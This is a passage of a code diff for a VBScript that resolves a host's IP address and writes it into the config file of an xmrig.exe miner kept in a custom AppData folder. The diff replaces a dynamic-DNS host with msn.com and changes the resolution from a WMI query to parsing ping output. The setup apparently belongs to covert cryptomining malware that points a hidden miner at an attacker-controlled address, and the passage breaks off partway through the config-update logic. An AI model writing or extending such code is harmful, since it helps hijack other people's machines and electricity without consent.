@@ -1,28 +1,27 @@
 ' Define variables
-host = "rijxm.ddns.net"
+host = "msn.com"
 configFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\config.json")
 xmrigPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\xmrig.exe")
 
 Set wshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' Resolve the IP address of the host
-Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-Set colPing = objWMIService.ExecQuery("SELECT * FROM Win32_PingStatus WHERE Address = '" & host & "'")
+' Ping the host to resolve the IP address
+Set execObj = wshShell.Exec("cmd /c ping -n 1 " & host)
+output = execObj.StdOut.ReadAll
 
+' Extract the IP address from the ping output
 ipAddress = ""
-For Each objStatus in colPing
-    If objStatus.StatusCode = 0 Then
-        ipAddress = objStatus.ProtocolAddress
-        Exit For
-    End If
-Next
+Set regExp = New RegExp
+regExp.Pattern = "\d{1,3}(\.\d{1,3}){3}" ' Regex to match an IPv4 address
+regExp.Global = False
 
-' Check if IP address was found
-If ipAddress = "" Then
-    WScript.Echo "Failed to resolve IP address for host: " & host
-    WScript.Quit
+Set matches = regExp.Execute(output)
+If matches.Count > 0 Then
+    ipAddress = matches(0)
 End If
+
+
 
 ' Update config.json with the detected IP address
 If fso.FileExists(configFilePath) Then
